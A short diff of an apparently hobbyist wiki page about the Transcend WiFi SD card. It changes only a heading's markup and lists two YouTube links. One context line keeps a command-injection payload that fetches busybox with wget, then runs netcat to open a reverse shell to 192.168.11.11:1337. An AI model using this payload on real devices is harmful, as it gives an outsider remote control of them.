@@ -10,6 +10,6 @@ title: Transcend WiFi SD
 admin; wget http://192.168.11.11/busybox-armv5l; chmod a+x /www/cgi-bin/busybox-armv5l; /www/cgi-bin/busybox-armv5l nc 192.168.11.11 1337 -e /bin/bash #
 ```
 
-==Transcend WiFi in combi met AVR==
+# Transcend WiFi in combi met AVR
 * https://www.youtube.com/watch?annotation_id=annotation_1323056153&feature=iv&src_vid=HT4W3CPlnAU&v=-Z9TrZQw16s
 * https://www.youtube.com/watch?v=HT4W3CPlnAU
